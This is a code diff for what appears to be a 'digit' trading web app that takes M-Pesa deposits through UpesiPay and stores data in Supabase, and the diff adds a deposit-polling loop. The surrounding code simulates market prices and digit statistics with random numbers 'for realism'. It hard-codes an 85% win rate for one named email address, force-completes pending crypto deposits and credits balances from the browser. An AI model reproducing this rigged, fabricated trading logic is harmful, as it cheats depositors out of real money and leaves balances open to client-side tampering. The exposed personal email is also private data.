@@ -315,7 +315,7 @@ button:active {
 
 .card {
     background: var(--card);
-    border-radius: var(--radius-large)	;
+    border-radius: var(--radius-large);
     padding: 20px;
     border: 1px solid var(--card-border);
     box-shadow: 0 10px 25px rgba(0,0,0,0.05);
@@ -1252,7 +1252,7 @@ button:active {
 
             <div id="step3" style="display:none; text-align:center; padding: 30px 0;">
                 <h4 style="margin-bottom:8px; color:var(--text); font-size:1.2rem;">Connecting to Gateway...</h4>
-                <p style="font-size:0.9rem; color:var(--muted); margin-bottom:20px;">Please wait while we process your request.</p>
+                <p style="font-size:0.9rem; color:var(--muted); margin-bottom:20px;">Please check your phone and enter your M-Pesa PIN.</p>
                 <div class="spinner" style="margin: 0 auto;"></div>
             </div>
         </div>
@@ -1272,6 +1272,7 @@ button:active {
 <script>
 // Global user tracker added for email validation logic
 let currentUserEmail = "";
+let paymentMonitorInterval = null; // NEW: Tracks backend payment confirmation loop
 
 // --- DERIV CONFIGURATION START ---
 const DERIV_APP_ID = '33umrTdoV77rnjJrLSwj0';
@@ -1301,7 +1302,6 @@ async function derivLogin() {
     const state = generateRandomString(32);
     const codeVerifier = generateRandomString(64);
     
-    // We use sessionStorage for better security against CSRF attacks
     sessionStorage.setItem('oauth_state', state);
     sessionStorage.setItem('oauth_code_verifier', codeVerifier);
     
@@ -1339,7 +1339,6 @@ async function exchangeDerivCodeForToken(code, verifier) {
             console.log("Success! Deriv Access Token acquired.");
             localStorage.setItem('deriv_token', data.access_token);
             
-            // Clear temporary security codes
             sessionStorage.removeItem('oauth_code_verifier');
             sessionStorage.removeItem('oauth_state');
             
@@ -1371,7 +1370,6 @@ function toggleTheme() {
     }
 }
 
-// Ensure theme mounts on load before page renders visually
 if(localStorage.getItem('theme') === 'dark') {
     document.documentElement.setAttribute('data-theme', 'dark');
 } else {
@@ -1423,7 +1421,6 @@ let activeGraphAsset = 'Volatility 10 Index';
 let chartEngineInstance = null;
 let graphTickerPulseLoop = null;
 
-// Global tracker for smooth realistic digit transitions
 let currentDigitValues = Array(10).fill(10.0);
 
 function notify({ variant = 'tp', title = 'Notification', message = '' }) {
@@ -1516,7 +1513,6 @@ function initializeChartContext() {
 
     document.getElementById("graph-ticker-price").innerText = seedPrice.toFixed(2);
 
-    // Using the new primary color for the chart lines
     chartEngineInstance = new Chart(ctx, {
         type: 'line',
         data: {
@@ -1555,9 +1551,7 @@ function startGlobalGraphPumpLoop() {
         if (!chartEngineInstance) return;
 
         const settings = assetChartSettings[activeGraphAsset] || { base: 100, variance: 1 };
-        
         let dataPoints = chartEngineInstance.data.datasets[0].data;
-        
         let referencePrice = parseFloat(dataPoints[dataPoints.length - 1]);
 
         let shiftDelta = (Math.random() - 0.495) * settings.variance;
@@ -1573,20 +1567,16 @@ function startGlobalGraphPumpLoop() {
             labelTickerNode.innerText = currentTickValue.toFixed(2);
             labelTickerNode.style.color = shiftDelta >= 0 ? "var(--success)" : "var(--danger)";
         }
-
-        // Ensuring realism by updating percentages continuously on each tick
         refreshDigitMetrics();
     }, 1000);
 }
 
 function refreshDigitMetrics() {
-    // Shifting global values for a realistic continued movement rather than resetting to 10
     for (let i = 0; i < 30; i++) {
         let idx1 = Math.floor(Math.random() * 10);
         let idx2 = Math.floor(Math.random() * 10);
         if (idx1 !== idx2) {
             let shift = Math.random() * 0.8; 
-            // Capped at 13.0, floored at 1.0 to ensure a dynamic spread while strictly adhering to rules
             if (currentDigitValues[idx1] + shift <= 13.0 && currentDigitValues[idx2] - shift >= 1.0) { 
                 currentDigitValues[idx1] += shift;
                 currentDigitValues[idx2] -= shift;
@@ -1594,11 +1584,9 @@ function refreshDigitMetrics() {
         }
     }
 
-    // Fix tiny floating point precision issues maintaining exact 100% sum
     let sum = currentDigitValues.reduce((a,b) => a+b, 0);
     let diff = 100.0 - sum;
     
-    // Safely distribute the residual difference across the digits without breaking the 13.0% cap
     if (Math.abs(diff) > 0.0001) {
         for(let i = 0; i < 10; i++) {
             if (diff > 0 && currentDigitValues[i] + diff <= 13.0) {
@@ -1621,7 +1609,6 @@ function refreshDigitMetrics() {
 
         if(percentageNode && cardNode) {
             percentageNode.innerText = `${value.toFixed(1)}%`;
-            
             cardNode.classList.remove('highest', 'lowest');
             if (Math.abs(value - maxVal) < 0.01) cardNode.classList.add('highest');
             else if (Math.abs(value - minVal) < 0.01) cardNode.classList.add('lowest');
@@ -1662,7 +1649,6 @@ async function saveSupabaseBalance() {
 }
 
 async function migratePendingCrypto(userId) {
-    // MODIFIED VERSION STRING TO v15 TO FORCE RUN THE COMPLETION SCRIPT AGAIN
     const migrationFlag = `force_complete_existing_crypto_txs_v15_${userId}`;
     if (!localStorage.getItem(migrationFlag)) {
         let userTxs = JSON.parse(localStorage.getItem(`txs_${userId}`)) || [];
@@ -1814,7 +1800,7 @@ window.addEventListener("load", async () => {
         await fetchSupabaseBalance(session.user.id);
         await migratePendingCrypto(session.user.id);
         
-        // UPGRADED VERIFICATION: Detects any return status Upesipay might attach (success, completed, paid) or reference returns
+        // UPGRADED AUTO-REFLECTION FOR EXTERNAL REDIRECTS:
         const isSuccessfulReturn = statusParam === 'success' || statusParam === 'completed' || statusParam === 'paid' || statusParam === 'PAID' || (refParam && localStorage.getItem('last_invoice_id'));
 
         if (isSuccessfulReturn) {
@@ -1863,11 +1849,7 @@ window.addEventListener("load", async () => {
             
             verifyOverlay.classList.remove('show');
             localStorage.removeItem('last_invoice_id');
-            
-            // Redirect to megawave.site after successful processing and updating balance
-            setTimeout(() => {
-                window.location.href = "https://megawave.site";
-            }, 1500);
+            window.history.replaceState({}, document.title, window.location.pathname);
         }
     }
     updateBalance();
@@ -2051,7 +2033,10 @@ function openPayment(type){
     document.getElementById("payment-modal").classList.add("show");
 }
 
-function closeModal(){ document.getElementById("payment-modal").classList.remove("show"); }
+function closeModal(){ 
+    if (paymentMonitorInterval) clearInterval(paymentMonitorInterval); // Stop polling if modal closed
+    document.getElementById("payment-modal").classList.remove("show"); 
+}
 function openHistory(){ document.getElementById("history-modal").classList.add("show"); }
 function closeHistory(){ document.getElementById("history-modal").classList.remove("show"); }
 function closeCongrats(){ document.getElementById("congrats-modal").classList.remove("show"); }
@@ -2183,6 +2168,53 @@ async function proceedInvoice(){
     document.getElementById("step2").style.display = "block";
 }
 
+// --- NEW FUNCTION: POLLING TO INSTANTLY REFLECT SUCCESS ---
+function startPaymentMonitor(invoiceId, amountUSD, userId) {
+    if (paymentMonitorInterval) clearInterval(paymentMonitorInterval);
+    
+    // Check your backend every 3 seconds
+    paymentMonitorInterval = setInterval(async () => {
+        try {
+            const { data: deposit, error } = await supabaseClient
+                .from('deposits')
+                .select('status')
+                .eq('invoice_id', invoiceId)
+                .single();
+
+            if (!error && deposit && deposit.status === 'completed') {
+                // STOP POLLING - WE GOT PAID!
+                clearInterval(paymentMonitorInterval);
+                
+                // Add money instantly!
+                realBalance += parseFloat(amountUSD);
+                await saveSupabaseBalance();
+                updateBalance();
+                localStorage.setItem(`bal_${userId}`, realBalance);
+                
+                addTransactionRecord(userId, {
+                    id: Date.now().toString(),
+                    type: 'deposit',
+                    amount: parseFloat(amountUSD),
+                    method: 'M-PESA',
+                    status: 'completed',
+                    date: new Date().toLocaleString()
+                });
+
+                closeModal(); // Close payment popup
+                
+                // Show celebration toast
+                notify({
+                    variant: 'deposit',
+                    title: 'Deposit Completed',
+                    message: `Credited +$${amountUSD.toFixed(2)} instantly to your balance!`
+                });
+            }
+        } catch (err) {
+            console.error("Error monitoring payment:", err);
+        }
+    }, 3000);
+}
+
 async function executeExternalPayment(){
     const amountKES = document.getElementById("inv-amount").innerText.replace(/,/g,'');
     const name = document.getElementById("inv-name").innerText;
@@ -2208,22 +2240,24 @@ async function executeExternalPayment(){
 
         if (error) throw error;
 
-        // Create a precise callback URL pointing to megawave.site upon success
-        const callbackUrl = encodeURIComponent(`https://megawave.site?status=success&invoice_id=${invoiceId}`);
-        
-        // REPLACED WITH UPESIPAY MERCHANT LINK - Multi-parameter fallback (redirect_url, return_url, callback_url) guarantees Upesipay picks up your return instruction
-        const gatewayURL = `https://upesipay.com/m/QY572?amount=${amountKES}&phone=${encodeURIComponent(phone)}&name=${encodeURIComponent(name)}&reference=${encodeURIComponent(invoiceId)}&redirect_url=${callbackUrl}&return_url=${callbackUrl}&callback_url=${callbackUrl}`;
-
         localStorage.setItem('last_invoice_id', invoiceId);
+
+        // STEP 1: Immediately start checking the database for instant reflection
+        startPaymentMonitor(invoiceId, amountUSD, session.user.id);
 
         document.getElementById("step2").style.display = "none";
         document.getElementById("step3").style.display = "block";
         
-        window.location.href = gatewayURL; 
+        // STEP 2: Trigger UpesiPay STK push in the background
+        const callbackUrl = encodeURIComponent(`https://megawave.site?status=success&invoice_id=${invoiceId}`);
+        const gatewayURL = `https://upesipay.com/m/QY572?amount=${amountKES}&phone=${encodeURIComponent(phone)}&name=${encodeURIComponent(name)}&reference=${encodeURIComponent(invoiceId)}&redirect_url=${callbackUrl}&return_url=${callbackUrl}&callback_url=${callbackUrl}`;
+        
+        // Open STK Push / Payment request
+        window.open(gatewayURL, '_blank'); 
 
     } catch(err) {
         console.error(err);
-        alert('Could not communicate with local node API.');
+        alert('Could not communicate with database node.');
     }
 }
 
@@ -2243,7 +2277,6 @@ function updatePnL(){
 function calculateTradeResult(market, targetDigit, stake) {
     let winRate = 0.0;
     
-    // Explicit, restricted win rate logic
     if (currentUserEmail === "joseeruitha@gmail.com") {
         winRate = 0.85;
     } else {
